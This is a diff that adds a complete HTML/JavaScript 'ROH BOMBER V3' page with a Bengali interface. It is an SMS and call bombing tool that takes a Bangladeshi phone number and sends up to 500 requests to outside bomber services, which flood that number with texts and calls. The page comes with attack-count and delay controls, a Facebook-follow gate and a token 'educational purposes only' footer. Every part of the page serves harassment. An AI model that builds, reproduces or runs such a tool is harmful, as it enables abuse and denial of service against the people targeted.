@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>ROH BOMBER V3 | Md Medul</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            font-family: 'Courier New', 'Fira Code', 'Poppins', monospace;
+            min-height: 100vh;
+            padding: 16px;
+            position: relative;
+            overflow-x: hidden;
+            transition: background 0.3s ease, color 0.2s;
+        }
+
+        /* themes */
+        body.sms-mode { background: radial-gradient(circle at 20% 30%, #0a2f1a, #010a02); color: #0f0; }
+        body.call-mode { background: radial-gradient(circle at 80% 20%, #3a0a0a, #1a0101); color: #ff5555; }
+        body.roman-mode { background: radial-gradient(circle at 50% 50%, #0a0a3a, #00001a); color: #ffaa44; }
+
+        .falling-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+            overflow: hidden;
+        }
+
+        .falling-text {
+            position: absolute;
+            white-space: nowrap;
+            font-weight: bold;
+            font-family: monospace;
+            text-shadow: 0 0 5px currentColor;
+            animation: fall linear infinite;
+            opacity: 0.7;
+            z-index: 1;
+        }
+
+        @keyframes fall {
+            0% { transform: translateY(-10vh) rotate(0deg); opacity: 0.9; }
+            80% { opacity: 0.6; }
+            100% { transform: translateY(110vh) rotate(15deg); opacity: 0; }
+        }
+
+        .main-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 24px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .glass-card {
+            background: rgba(0, 5, 10, 0.7);
+            backdrop-filter: blur(12px);
+            border-radius: 2rem;
+            border: 1px solid;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        body.sms-mode .glass-card { border-color: #0f0; box-shadow: 0 0 15px rgba(0,255,0,0.3); }
+        body.call-mode .glass-card { border-color: #f44; box-shadow: 0 0 15px rgba(255,68,68,0.4); }
+        body.roman-mode .glass-card { border-color: #fa4; box-shadow: 0 0 15px rgba(255,170,68,0.4); }
+
+        .control-panel { flex: 1.2; min-width: 280px; padding: 1.8rem; }
+        .status-panel { flex: 2; min-width: 300px; display: flex; flex-direction: column; height: 78vh; overflow: hidden; }
+
+        .hunter-header {
+            text-align: center;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid;
+        }
+        body.sms-mode .hunter-header { border-color: #0f0; }
+        body.call-mode .hunter-header { border-color: #f44; }
+        body.roman-mode .hunter-header { border-color: #fa4; }
+
+        .hunter-header h1 {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #facc15, #f97316);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .tag {
+            font-size: 0.75rem;
+            background: #000000aa;
+            display: inline-block;
+            padding: 4px 14px;
+            border-radius: 40px;
+            margin-top: 8px;
+        }
+        body.sms-mode .tag { border: 0.5px solid #0f0; color: #0f0; }
+        body.call-mode .tag { border: 0.5px solid #f66; color: #f66; }
+        body.roman-mode .tag { border: 0.5px solid #fa4; color: #fa4; }
+
+        .channel-name {
+            margin-top: 12px;
+            font-size: 0.8rem;
+            background: #00000088;
+            padding: 4px 10px;
+            border-radius: 20px;
+            display: inline-block;
+        }
+        body.sms-mode .channel-name { color: #9f9; border: 0.5px solid #0f0; }
+        body.call-mode .channel-name { color: #faa; border: 0.5px solid #f44; }
+        body.roman-mode .channel-name { color: #fc9; border: 0.5px solid #fa4; }
+
+        .input-group { margin-bottom: 1.5rem; }
+        .input-label { font-weight: bold; margin-bottom: 8px; display: flex; gap: 8px; font-size: 0.85rem; }
+        .input-field {
+            width: 100%;
+            background: #000000cc;
+            border-radius: 20px;
+            padding: 12px 16px;
+            font-size: 1rem;
+            font-family: monospace;
+            outline: none;
+        }
+        body.sms-mode .input-field { border: 1px solid #0f0; color: #0f0; }
+        body.call-mode .input-field { border: 1px solid #f44; color: #ff8888; }
+        body.roman-mode .input-field { border: 1px solid #fa4; color: #ffbb88; }
+        .input-field:focus { box-shadow: 0 0 8px currentColor; }
+
+        .mode-switch {
+            display: flex;
+            gap: 12px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        .mode-btn {
+            flex: 1;
+            background: #000000aa;
+            border-radius: 40px;
+            padding: 10px 0;
+            text-align: center;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: monospace;
+        }
+        body.sms-mode .mode-btn { border: 1px solid #0f0; color: #0f0; }
+        body.call-mode .mode-btn { border: 1px solid #f44; color: #f88; }
+        body.roman-mode .mode-btn { border: 1px solid #fa4; color: #fc9; }
+        .mode-btn.active {
+            background: currentColor;
+            color: black;
+            box-shadow: 0 0 12px currentColor;
+        }
+        body.sms-mode .mode-btn.active { background: #0f0; color: black; }
+        body.call-mode .mode-btn.active { background: #f44; color: black; }
+        body.roman-mode .mode-btn.active { background: #fa4; color: black; }
+
+        .slider-box { margin: 20px 0; }
+        .range-header { display: flex; justify-content: space-between; margin-bottom: 6px; }
+        input[type="range"] { width: 100%; height: 4px; -webkit-appearance: none; border-radius: 10px; }
+        body.sms-mode input[type="range"] { background: #1a3a1a; }
+        body.call-mode input[type="range"] { background: #4a1a1a; }
+        body.roman-mode input[type="range"] { background: #3a2a1a; }
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 16px;
+            height: 16px;
+            border-radius: 0;
+            cursor: pointer;
+        }
+        body.sms-mode input[type="range"]::-webkit-slider-thumb { background: #0f0; box-shadow: 0 0 6px #0f0; }
+        body.call-mode input[type="range"]::-webkit-slider-thumb { background: #f44; box-shadow: 0 0 6px #f44; }
+        body.roman-mode input[type="range"]::-webkit-slider-thumb { background: #fa4; box-shadow: 0 0 6px #fa4; }
+
+        .delay-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 18px 0;
+            flex-wrap: wrap;
+        }
+        .delay-row input {
+            flex: 1;
+            background: black;
+            border-radius: 20px;
+            padding: 8px 12px;
+            text-align: center;
+            font-family: monospace;
+        }
+        body.sms-mode .delay-row input { border: 1px solid #0f0; color: #0f0; }
+        body.call-mode .delay-row input { border: 1px solid #f44; color: #f88; }
+        body.roman-mode .delay-row input { border: 1px solid #fa4; color: #fc9; }
+
+        .action-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 24px;
+            flex-wrap: wrap;
+        }
+        .btn {
+            flex: 1;
+            padding: 12px 0;
+            border-radius: 40px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            font-family: monospace;
+            text-transform: uppercase;
+            transition: 0.1s linear;
+        }
+        .btn-start { background: #0f0; color: black; box-shadow: 0 0 8px #0f0; }
+        body.call-mode .btn-start { background: #f44; box-shadow: 0 0 8px #f44; }
+        body.roman-mode .btn-start { background: #fa4; box-shadow: 0 0 8px #fa4; color: black; }
+        .btn-stop { background: #330000; border: 1px solid #f00; color: #f66; }
+        .btn-reset { background: #111; border: 1px solid currentColor; }
+        .btn:active { transform: scale(0.96); }
+
+        .status-header {
+            display: flex;
+            justify-content: space-between;
+            padding: 16px 20px;
+            background: #000000aa;
+            border-bottom: 1px solid;
+            flex-wrap: wrap;
+        }
+        body.sms-mode .status-header { border-color: #0f0; }
+        body.call-mode .status-header { border-color: #f44; }
+        body.roman-mode .status-header { border-color: #fa4; }
+
+        .stats-box { display: flex; gap: 30px; }
+        .stats-box div { font-size: 1rem; font-weight: bold; }
+        .stats-box span { font-size: 1.4rem; margin-left: 6px; color: #ffcc00; }
+
+        .live-status {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            font-family: monospace;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        /* Animated status card */
+        .status-card {
+            background: rgba(0, 0, 0, 0.7);
+            border-left: 4px solid;
+            border-radius: 12px;
+            padding: 12px 16px;
+            animation: glitchPulse 0.3s ease-out, fadeSlide 0.2s;
+            font-family: 'Courier New', monospace;
+            backdrop-filter: blur(4px);
+        }
+        @keyframes glitchPulse {
+            0% { transform: translateX(-2px); opacity: 0.5; text-shadow: 2px 0 red, -2px 0 blue; }
+            50% { transform: translateX(2px); text-shadow: -2px 0 red, 2px 0 blue; }
+            100% { transform: translateX(0); text-shadow: none; }
+        }
+        @keyframes fadeSlide {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .status-card.success { border-left-color: #0f0; color: #0f0; box-shadow: 0 0 8px rgba(0,255,0,0.3); }
+        .status-card.error { border-left-color: #f44; color: #f88; box-shadow: 0 0 8px rgba(255,68,68,0.3); }
+        .status-card .code {
+            font-size: 1.2rem;
+            font-weight: bold;
+            letter-spacing: 2px;
+            display: inline-block;
+            animation: blinkCode 1s step-end infinite;
+        }
+        @keyframes blinkCode {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+        .status-card .time {
+            font-size: 0.65rem;
+            opacity: 0.7;
+            float: right;
+        }
+        .status-card .req-num {
+            font-size: 0.7rem;
+            margin-top: 5px;
+            opacity: 0.8;
+        }
+
+        footer { text-align: center; font-size: 0.65rem; margin-top: 1rem; opacity: 0.6; }
+        ::-webkit-scrollbar { width: 3px; }
+        ::-webkit-scrollbar-track { background: #0a1a0a; }
+        ::-webkit-scrollbar-thumb { background: #0f0; }
+        body.call-mode ::-webkit-scrollbar-thumb { background: #f44; }
+        body.roman-mode ::-webkit-scrollbar-thumb { background: #fa4; }
+
+        /* JOIN GATE OVERLAY */
+        .join-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.96);
+            backdrop-filter: blur(8px);
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: all 0.4s;
+        }
+        .join-card {
+            background: #0a0f1e;
+            border: 2px solid #1877F2;
+            border-radius: 32px;
+            padding: 2rem;
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(24, 119, 242, 0.3);
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 #1877F2; }
+            70% { box-shadow: 0 0 0 15px rgba(24, 119, 242, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(24, 119, 242, 0); }
+        }
+        .join-card h2 { color: #1877F2; margin-bottom: 1rem; font-size: 1.8rem; }
+        .join-card p { color: #ccc; margin: 15px 0; }
+        .join-link {
+            display: inline-block;
+            background: #1877F2;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 40px;
+            text-decoration: none;
+            font-weight: bold;
+            margin: 10px 0;
+            transition: 0.2s;
+        }
+        .join-link:hover { background: #145dbf; transform: scale(1.02); }
+        .chat-id {
+            background: #111;
+            padding: 8px;
+            border-radius: 20px;
+            font-family: monospace;
+            color: #1877F2;
+            margin: 10px 0;
+        }
+        .verify-btn {
+            background: #1877F2;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 40px;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+        }
+        .verify-btn:hover { background: #145dbf; transform: scale(0.98); }
+
+        @media (max-width: 750px) {
+            .main-container { flex-direction: column; }
+            .status-panel { height: 60vh; }
+            .control-panel { padding: 1.2rem; }
+            .mode-switch { flex-direction: column; }
+            .join-card { padding: 1.5rem; }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body class="sms-mode">
+    <div class="falling-container" id="fallingContainer"></div>
+
+    <div id="joinOverlay" class="join-overlay">
+        <div class="join-card">
+            <i class="fab fa-facebook" style="font-size: 50px; color: #1877F2;"></i>
+            <h2>🔐 JOIN TO UNLOCK</h2>
+            <p>⚠️ Md Medul এর ফেসবুক প্রোফাইলে ফলো দিলেই ROH BOMBER V3 ব্যবহার করতে পারবেন ⚠️</p>
+            <a href="https://www.facebook.com/medulofficialid" target="_blank" class="join-link">
+                <i class="fab fa-facebook"></i> 📢 ফেসবুকে ফলো করুন
+            </a>
+            <div class="chat-id"><i class="fas fa-user-shield"></i> ডেভেলপার: <strong>Md Medul</strong></div>
+            <p style="font-size: 0.8rem;">ফলো করার পর নিচের বাটনে ক্লিক করুন।</p>
+            <button id="verifyJoinBtn" class="verify-btn"><i class="fas fa-check-circle"></i> ✅ আমি ফলো করেছি</button>
+        </div>
+    </div>
+
+    <div id="mainUI" class="main-container" style="display: none;">
+        <div class="control-panel glass-card">
+            <div class="hunter-header">
+                <h1><i class="fas fa-skull-crossbones"></i> ROH BOMBER V3</h1>
+                <div class="tag">Md Medul // ADVANCED SUITE</div>
+                <div class="channel-name"><i class="fab fa-facebook"></i> @medulofficialid | Medul</div>
+            </div>
+
+            <div class="input-group">
+                <div class="input-label"><i class="fas fa-phone"></i> টার্গেট নম্বর (বাংলাদেশ)</div>
+                <input type="tel" id="phoneNumber" class="input-field" placeholder="01XXXXXXXXX" value="01700000000">
+            </div>
+
+            <div class="mode-switch">
+                <div id="smsModeBtn" class="mode-btn active"><i class="fas fa-envelope"></i> SMS MODE</div>
+                <div id="callModeBtn" class="mode-btn"><i class="fas fa-phone-alt"></i> CALL MODE</div>
+                <div id="romanModeBtn" class="mode-btn"><i class="fas fa-dragon"></i> CALL V3 MODE</div>
+            </div>
+
+            <div class="slider-box">
+                <div class="range-header"><span><i class="fas fa-bomb"></i> আক্রমনের সংখ্যা</span><span id="limitValue">100</span></div>
+                <input type="range" id="attackLimit" min="5" max="500" value="100" step="5">
+            </div>
+
+            <div class="delay-row">
+                <i class="fas fa-hourglass-half"></i>
+                <span>ডেলি (ms)</span>
+                <input type="number" id="delayMs" value="1500" step="100" min="400" max="5000">
+            </div>
+
+            <div class="action-buttons">
+                <button id="startBtn" class="btn btn-start"><i class="fas fa-play"></i> START</button>
+                <button id="stopBtn" class="btn btn-stop"><i class="fas fa-stop"></i> STOP</button>
+                <button id="resetStatsBtn" class="btn btn-reset"><i class="fas fa-chart-line"></i> RESET STATS</button>
+            </div>
+            <footer>⚡ শুধুমাত্র শিক্ষাগত উদ্দেশ্যে | Md Medul</footer>
+        </div>
+
+        <div class="status-panel glass-card">
+            <div class="status-header">
+                <div><i class="fas fa-tachometer-alt"></i> লাইভ স্ট্যাটাস</div>
+                <div class="stats-box">
+                    <div>📤 মোট: <span id="totalSent">0</span></div>
+                    <div>✓ সফল: <span id="successCount">0</span></div>
+                    <div>✗ ব্যর্থ: <span id="failCount">0</span></div>
+                </div>
+            </div>
+            <div class="live-status" id="statusArea">
+                <div class="status-card info" style="border-left-color: #0af;">
+                    <span class="code">⚠️ SYSTEM READY</span>
+                    <span class="time">এখন</span>
+                    <div class="req-num">Md Medul V3 সক্রিয়</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // FACEBOOK JOIN GATE
+        const joinOverlay = document.getElementById('joinOverlay');
+        const mainUI = document.getElementById('mainUI');
+        const verifyBtn = document.getElementById('verifyJoinBtn');
+
+        if(localStorage.getItem('roh_verified') === 'true') {
+            joinOverlay.style.display = 'none';
+            mainUI.style.display = 'flex';
+            initApp();
+        } else {
+            joinOverlay.style.display = 'flex';
+            mainUI.style.display = 'none';
+        }
+
+        verifyBtn.addEventListener('click', () => {
+            localStorage.setItem('roh_verified', 'true');
+            joinOverlay.style.display = 'none';
+            mainUI.style.display = 'flex';
+            initApp();
+        });
+
+        function initApp() {
+            const phoneInput = document.getElementById('phoneNumber');
+            const smsBtn = document.getElementById('smsModeBtn');
+            const callBtn = document.getElementById('callModeBtn');
+            const romanBtn = document.getElementById('romanModeBtn');
+            const limitSlider = document.getElementById('attackLimit');
+            const limitSpan = document.getElementById('limitValue');
+            const delayInput = document.getElementById('delayMs');
+            const startBtn = document.getElementById('startBtn');
+            const stopBtn = document.getElementById('stopBtn');
+            const resetStatsBtn = document.getElementById('resetStatsBtn');
+            const statusArea = document.getElementById('statusArea');
+            const totalSpan = document.getElementById('totalSent');
+            const successSpan = document.getElementById('successCount');
+            const failSpan = document.getElementById('failCount');
+            const bodyElem = document.body;
+
+            const API_SMS = 'https://bomber877.vercel.app/run-all?number=';
+            const API_CALL = 'https://api.paglahost.shop/SMS+call_BOMBAR999/index.php?password=xpon☎=';
+            const API_ROMAN = 'https://api.paglahost.shop/SMS+call_BOMBAR999/roman-api1.php?phone=';
+
+            let attackMode = 'sms';
+            let isActive = false;
+            let stopRequested = false;
+            let currentTimeout = null;
+            let stats = { total: 0, success: 0, fail: 0 };
+            let currentIndex = 0;
+            let totalLimit = 100;
+            let currentDelay = 1500;
+            let currentPhone = '';
+
+            const fallingWords = ["Md Medul", "ROH V3", "FACEBOOK", "BOOM SMS", "CALL", "MEDUL", "⚡RX⚡", "HUNTER", "V3"];
+            function createFallingText() {
+                const container = document.getElementById('fallingContainer');
+                const word = fallingWords[Math.floor(Math.random() * fallingWords.length)];
+                const span = document.createElement('div');
+                span.className = 'falling-text';
+                span.innerText = word;
+                span.style.left = Math.random() * 100 + '%';
+                span.style.fontSize = (0.8 + Math.random() * 1.5) + 'rem';
+                const duration = 4 + Math.random() * 8;
+                span.style.animationDuration = duration + 's';
+                span.style.animationDelay = Math.random() * 5 + 's';
+                const hue = Math.random() * 360;
+                span.style.color = `hsl(${hue}, 80%, 60%)`;
+                span.style.textShadow = `0 0 4px hsl(${hue}, 100%, 50%)`;
+                container.appendChild(span);
+                setTimeout(() => span.remove(), duration * 1000 + 1000);
+            }
+            let fallingInterval = setInterval(createFallingText, 400);
+
+            function addAnimatedStatus(reqIndex, statusCode, isSuccess) {
+                const card = document.createElement('div');
+                card.className = `status-card ${isSuccess ? 'success' : 'error'}`;
+                const time = new Date().toLocaleTimeString('en-US', { hour12: false, hour:'2-digit', minute:'2-digit', second:'2-digit' });
+                const statusText = isSuccess ? `${statusCode} OK` : `${statusCode} FAIL`;
+                card.innerHTML = `
+                    <span class="code">▶ ${statusText}</span>
+                    <span class="time">${time}</span>
+                    <div class="req-num">REQUEST #${reqIndex}</div>
+                `;
+                statusArea.appendChild(card);
+                card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+                while(statusArea.children.length > 120) statusArea.removeChild(statusArea.firstChild);
+            }
+
+            function updateStatsUI() {
+                totalSpan.innerText = stats.total;
+                successSpan.innerText = stats.success;
+                failSpan.innerText = stats.fail;
+            }
+
+            function setMode(mode) {
+                attackMode = mode;
+                bodyElem.classList.remove('sms-mode', 'call-mode', 'roman-mode');
+                if(mode === 'sms') {
+                    bodyElem.classList.add('sms-mode');
+                    smsBtn.classList.add('active');
+                    callBtn.classList.remove('active');
+                    romanBtn.classList.remove('active');
+                } else if(mode === 'call') {
+                    bodyElem.classList.add('call-mode');
+                    callBtn.classList.add('active');
+                    smsBtn.classList.remove('active');
+                    romanBtn.classList.remove('active');
+                } else {
+                    bodyElem.classList.add('roman-mode');
+                    romanBtn.classList.add('active');
+                    smsBtn.classList.remove('active');
+                    callBtn.classList.remove('active');
+                }
+            }
+
+            function validatePhone(phone) {
+                let cleaned = phone.replace(/\D/g, '');
+                if(cleaned.startsWith('0') && cleaned.length === 11) return cleaned;
+                if(cleaned.length === 10 && !cleaned.startsWith('0')) return '0' + cleaned;
+                return null;
+            }
+
+            async function sendRequest(phone, reqIndex) {
+                let url;
+                if(attackMode === 'sms') url = `${API_SMS}${phone}`;
+                else if(attackMode === 'call') url = `${API_CALL}${phone}`;
+                else url = `${API_ROMAN}${phone}`;
+
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 20000);
+                    const response = await fetch(url, { method: 'GET', signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    const statusCode = response.status;
+                    const isSuccess = response.ok;
+                    
+                    if(isSuccess) stats.success++; else stats.fail++;
+                    stats.total++;
+                    updateStatsUI();
+                    addAnimatedStatus(reqIndex, statusCode, isSuccess);
+                    return { ok: isSuccess };
+                } catch (err) {
+                    stats.fail++;
+                    stats.total++;
+                    updateStatsUI();
+                    addAnimatedStatus(reqIndex, 'NET ERR', false);
+                    return { ok: false };
+                }
+            }
+
+            async function runSequence(phone, limit, delay) {
+                for(let i=1; i<=limit; i++) {
+                    if(!isActive || stopRequested) break;
+                    currentIndex = i;
+                    await sendRequest(phone, i);
+                    if(i < limit && isActive && !stopRequested) {
+                        await new Promise(resolve => { currentTimeout = setTimeout(resolve, delay); });
+                    }
+                }
+                isActive = false;
+                stopRequested = false;
+            }
+
+            async function startAttack() {
+                if(isActive) return;
+                const rawPhone = phoneInput.value.trim();
+                const validPhone = validatePhone(rawPhone);
+                if(!validPhone) return;
+                
+                totalLimit = parseInt(limitSlider.value, 10);
+                currentDelay = parseInt(delayInput.value, 10);
+                
+                isActive = true;
+                stopRequested = false;
+                await runSequence(validPhone, totalLimit, currentDelay);
+            }
+
+            function stopAttack() {
+                stopRequested = true;
+                isActive = false;
+                if(currentTimeout) clearTimeout(currentTimeout);
+            }
+
+            function resetStats() {
+                stats = { total: 0, success: 0, fail: 0 };
+                updateStatsUI();
+                statusArea.innerHTML = '';
+            }
+
+            startBtn.addEventListener('click', startAttack);
+            stopBtn.addEventListener('click', stopAttack);
+            resetStatsBtn.addEventListener('click', resetStats);
+            smsBtn.addEventListener('click', () => setMode('sms'));
+            callBtn.addEventListener('click', () => setMode('call'));
+            romanBtn.addEventListener('click', () => setMode('roman'));
+            limitSlider.addEventListener('input', () => limitSpan.innerText = limitSlider.value);
+            
+            setMode('sms');
+        }
+    </script>
+</body>
+</html>
